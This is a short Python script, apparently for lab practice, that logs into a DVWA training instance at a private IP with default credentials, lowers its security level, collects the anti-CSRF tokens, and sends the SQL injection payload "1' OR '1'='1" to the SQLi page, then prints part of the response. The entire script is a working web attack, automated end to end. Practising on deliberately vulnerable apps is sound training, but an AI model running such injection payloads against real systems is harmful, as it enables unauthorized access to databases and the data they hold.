import requests
from bs4 import BeautifulSoup

s = requests.Session()

# Login
r = s.get('http://192.168.56.101/dvwa/login.php')
soup = BeautifulSoup(r.text, 'html.parser')
token = soup.find('input', {'name': 'user_token'})
creds = {'username': 'admin', 'password': 'password', 'Login': 'Login'}
if token:
    creds['user_token'] = token['value']
s.post('http://192.168.56.101/dvwa/login.php', data=creds)

# Set security to low
sec_page = s.get('http://192.168.56.101/dvwa/security.php')
soup2 = BeautifulSoup(sec_page.text, 'html.parser')
sec_token = soup2.find('input', {'name': 'user_token'})
sec_data = {'security': 'low', 'seclev_submit': 'Submit'}
if sec_token:
    sec_data['user_token'] = sec_token['value']
s.post('http://192.168.56.101/dvwa/security.php', data=sec_data)

# Get fresh token from SQLi page
sqli_page = s.get('http://192.168.56.101/dvwa/vulnerabilities/sqli/')
soup3 = BeautifulSoup(sqli_page.text, 'html.parser')
token2 = soup3.find('input', {'name': 'user_token'})

# Fire payload
params = {'id': "1' OR '1'='1", 'Submit': 'Submit'}
if token2:
    params['user_token'] = token2['value']

r2 = s.get('http://192.168.56.101/dvwa/vulnerabilities/sqli/', params=params)
print("Response length:", len(r2.text))
print(r2.text[2500:5500])